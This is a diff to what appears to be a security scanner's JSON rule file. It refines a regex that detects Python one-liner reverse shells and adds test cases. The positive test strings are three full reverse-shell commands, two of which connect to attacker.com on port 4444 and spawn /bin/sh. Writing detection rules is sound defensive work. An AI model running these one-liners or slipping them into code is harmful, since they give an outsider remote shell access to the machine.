@@ -77,11 +77,23 @@
     {
       "id": "SCRIPT-003",
       "title": "Python reverse shell",
-      "description": "Python one-liner reverse shell pattern.",
+      "description": "Python one-liner reverse shell pattern combining socket with shell spawning (subprocess, os.dup2, pty.spawn).",
       "severity": "critical",
-      "pattern": "python[23]?\\s+-c\\s+.import\\s+socket",
+      "pattern": "python[23]?\\s+-c\\s+.import\\s+socket.*?(?:subprocess\\.(?:call|Popen|run)|os\\.dup2|pty\\.spawn)",
       "file_extensions": ["sh", "bash", "zsh"],
-      "remediation": "Remove reverse shell code."
+      "remediation": "Remove reverse shell code.",
+      "test_cases": {
+        "should_match": [
+          "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+          "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'",
+          "python -c \"import socket,subprocess;s=socket.socket();s.connect(('host',1234));subprocess.Popen(['/bin/bash'],stdin=s.fileno())\""
+        ],
+        "should_not_match": [
+          "python3 -c \"import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(('8.8.8.8', 80)); print(s.getsockname()[0])\"",
+          "python -c 'import socket;s=socket.socket();s.connect((\"example.com\",443));data=s.recv(1024);print(data)'",
+          "python3 -c \"import socket; sock = socket.socket(); sock.bind(('localhost', 9000))\""
+        ]
+      }
     },
     {
       "id": "SHELL-007",
